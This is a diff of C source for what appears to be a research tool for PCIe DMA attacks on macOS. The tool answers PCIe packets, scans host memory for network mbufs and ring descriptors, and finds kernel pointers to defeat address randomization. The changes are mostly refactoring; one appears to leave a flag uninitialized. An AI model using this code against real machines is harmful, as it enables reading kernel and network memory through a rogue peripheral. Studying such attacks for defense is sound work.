@@ -39,7 +39,7 @@
 #include "mask.h"
 #include "macos-mbuf-manipulation.h"
 #include "macos-stub-mbuf.h"
-#include "hexdump.h"
+#include "crhexdump.h"
 #include "pcie.h"
 #include "pcie-backend.h"
 #include "qemu/bswap.h"
@@ -167,8 +167,8 @@ is_probably_mbuf(const struct mbuf *mbuf)
 		*/
 		((mbuf->m_nextpkt & 0xFF) == 0) &&
 		(mbuf->m_type <= MT_MAX) &&
-		(mbuf->m_len >= 0) && (mbuf->m_len <= 16384) &&
-		!(mbuf->m_next == 0 && mbuf->m_nextpkt == 0 && mbuf->m_data == 0);
+		(mbuf->m_len >= 0) && (mbuf->m_len <= 16384); /* &&
+		!(mbuf->m_next == 0 && mbuf->m_nextpkt == 0 && mbuf->m_data == 0); */
 }
 
 uint8_t *
@@ -215,7 +215,7 @@ print_page_at_address(uint64_t address, uint32_t devfn)
 	}
 
 	printf("0x%lx\n", get_page_address(address));
-	hexdump(page_data, 4096);
+	crhexdump(page_data, 4096);
 
 	return read_result;
 }
@@ -305,8 +305,9 @@ respond_to_packet(struct packet_response_state *state,
 		}
 		break;
 	default:
-		printf("Ignoring %s (0x%x) TLP.\n", tlp_type_str(dword0->type),
-			dword0->type);
+		/*printf("Ignoring %s (0x%x) TLP.\n", tlp_type_str(dword0->type),*/
+			/*dword0->type);*/
+		puts("Ignoring a TLP :(");
 		break;
 	}
 	return response;
@@ -331,7 +332,7 @@ main(int argc, char *argv[])
 	struct packet_response_state packet_response_state;
 	packet_response_state.outer_loop = AS_LINEAR_SCAN_FOR_MBUF;
 	packet_response_state.attack_state = AS_UNINITIALISED;
-	uint64_t read_addr, next_read_addr = 0x400000;
+	uint64_t read_addr, next_read_addr = 0x000000;
 	/*uint64_t read_addr, next_read_addr = 0x800000;*/
 	/*
 	 * We have found that in practise the tx ring is not located lower
@@ -371,7 +372,7 @@ main(int argc, char *argv[])
 	 */
 
 	while (1) {
-		wait_for_tlp(tlp_in_quadword, sizeof(tlp_in_quadword), &raw_tlp_in);
+		next_tlp(&raw_tlp_in);
 
 		if (is_raw_tlp_valid(&raw_tlp_in)) {
 			response = respond_to_packet(&packet_response_state,
@@ -380,8 +381,10 @@ main(int argc, char *argv[])
 				send_result = send_tlp(&raw_tlp_out);
 				assert(send_result != -1);
 			}
+			free_raw_tlp_buffer(&raw_tlp_in);
 			continue;
 		}
+		free_raw_tlp_buffer(&raw_tlp_in);
 
 		switch (packet_response_state.attack_state) {
 		case AS_UNINITIALISED:
@@ -413,11 +416,11 @@ main(int argc, char *argv[])
 			for (i = 0; i < 32; ++i) {
 				candidate_symbols[i] = bswap64(candidate_symbols[i]);
 				/*if ((candidate_symbols[i] & 0xfffff) == 0x283c0) {*/
-					/*printf("\nFound slid gIOBMDAllocator.\n");*/
-					/*printf("At address 0x%lx.\n", read_addr);*/
-					/*printf("Slid address: 0x%lx.\n", candidate_symbols[i]);*/
-					/*printf("Slide: 0x%lx.\n", candidate_symbols[i] -*/
-						/*0xffffff8000b283c0l);*/
+				/*printf("\nFound slid gIOBMDAllocator.\n");*/
+				/*printf("At address 0x%lx.\n", read_addr);*/
+				/*printf("Slid address: 0x%lx.\n", candidate_symbols[i]);*/
+				/*printf("Slide: 0x%lx.\n", candidate_symbols[i] -*/
+				/*0xffffff8000b283c0l);*/
 				/*}*/
 				if ((candidate_symbols[i] & 0xFFFFFFFFFF000000) ==
 					0xFFFFFF8000000000) {
@@ -442,13 +445,13 @@ main(int argc, char *argv[])
 			/*ring_plausible = true;*/
 
 			/*for (i = 0; i < 16; ++i) {*/
-				/*ring_plausible = ring_plausible &&*/
-					/*is_brett_descriptor(&(descriptors[i]));*/
+			/*ring_plausible = ring_plausible &&*/
+			/*is_brett_descriptor(&(descriptors[i]));*/
 			/*}*/
 
 			if (!is_probably_descriptor(&(descriptors[0]))) {
-			/*if (!is_brett_descriptor(&(descriptors[0]))) {*/
-			/*if (!ring_plausible) {*/
+				/*if (!is_brett_descriptor(&(descriptors[0]))) {}*/
+				/*if (!ring_plausible) {}*/
 				continue;
 			}
 			printf("Probably a descriptor at 0x%lx OK.\n", read_addr);
@@ -481,7 +484,7 @@ main(int argc, char *argv[])
 					if (read_result == -1) {
 						printf("Read failed. :(\n");
 					} else {
-						hexdump(read_buffer, length);
+						crhexdump(read_buffer, length);
 					}
 #endif
 				} else { /* It's an mbuf, so we can look at the whole page. */
@@ -523,15 +526,13 @@ main(int argc, char *argv[])
 					mbuf_page_address);
 				continue;
 			} else {
-				all_mbufs = true;
-#if 0
+				/*all_mbufs = true;*/
 				for (mbuf_index = 0; mbuf_index < MBUFS_PER_PAGE; ++mbuf_index) {
 					if (!is_probably_mbuf(mbuf_page + mbuf_index)) {
 						all_mbufs = false;
 						break;
 					}
 				}
-#endif
 				if (all_mbufs) {
 					printf("Found mbuf page at: 0x%lx.\n", mbuf_page_address);
 					for (mbuf_index = 0; mbuf_index < MBUFS_PER_PAGE;
@@ -542,13 +543,13 @@ main(int argc, char *argv[])
 						}
 					}
 				}
-				hexdump(mbuf_page, 4096);
+				/*crhexdump((uint8_t *)mbuf_page, 4096);*/
 			}
 			packet_response_state.attack_state =
 				packet_response_state.outer_loop;
 			break;
 		}
 	}
-	
+
 	puts("Quitting main loop.");
 }
